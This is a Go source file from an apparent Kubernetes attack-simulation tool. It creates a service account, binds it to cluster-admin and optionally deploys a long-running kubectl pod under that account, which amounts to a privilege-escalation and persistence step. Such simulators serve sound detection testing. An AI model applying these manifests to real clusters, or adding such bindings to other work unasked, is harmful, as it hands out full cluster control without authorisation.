package attacks

import (
    "fmt"
    "strings"
    "k8s-attack-simulator/internal/kube"
)

func BuildPrivescYAMLs(baseName, appLabel string, withPod bool) (string, string, string) {
    sa := fmt.Sprintf(`apiVersion: v1
kind: ServiceAccount
metadata:
  name: %s
  labels:
    app: %s
`, baseName, appLabel)

    crb := fmt.Sprintf(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: %s-cluster-admin
  labels:
    app: %s
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: %s
  namespace: PLACEHOLDER_NAMESPACE
`, baseName, appLabel, baseName)

    dep := ""
    if withPod {
        dep = fmt.Sprintf(`apiVersion: apps/v1
kind: Deployment
metadata:
  name: %s-kubectl
  labels:
    app: %s
spec:
  replicas: 1
  selector:
    matchLabels:
      app: %s
      name: %s-kubectl
  template:
    metadata:
      labels:
        app: %s
        name: %s-kubectl
    spec:
      serviceAccountName: %s
      containers:
      - name: kubectl
        image: bitnami/kubectl:latest
        command: ["sleep","infinity"]
`, baseName, appLabel, appLabel, baseName, appLabel, baseName, baseName)
    }
    return sa, crb, dep
}

func RunPrivesc(namespace, context, kubeconfig string, withPod bool) (string, error) {
    sa, crb, dep := BuildPrivescYAMLs("kas-privesc", "k8s-attack-simulator", withPod)
    // Apply SA (namespaced)
    out1, err := kube.ApplyYAML(sa, namespace, context, kubeconfig)
    if err != nil { return out1, err }
    // Apply CRB (cluster-scoped): replace placeholder with actual namespace
    crb = replaceNamespacePlaceholder(crb, namespace)
    out2, err := kube.ApplyYAML(crb, "", context, kubeconfig)
    if err != nil { return out1 + out2, err }
    out := out1 + out2
    if withPod && dep != "" {
        out3, err := kube.ApplyYAML(dep, namespace, context, kubeconfig)
        out += out3
        if err != nil { return out, err }
    }
    return out, nil
}

func replaceNamespacePlaceholder(doc, namespace string) string {
    return strings.ReplaceAll(doc, "PLACEHOLDER_NAMESPACE", namespace)
}
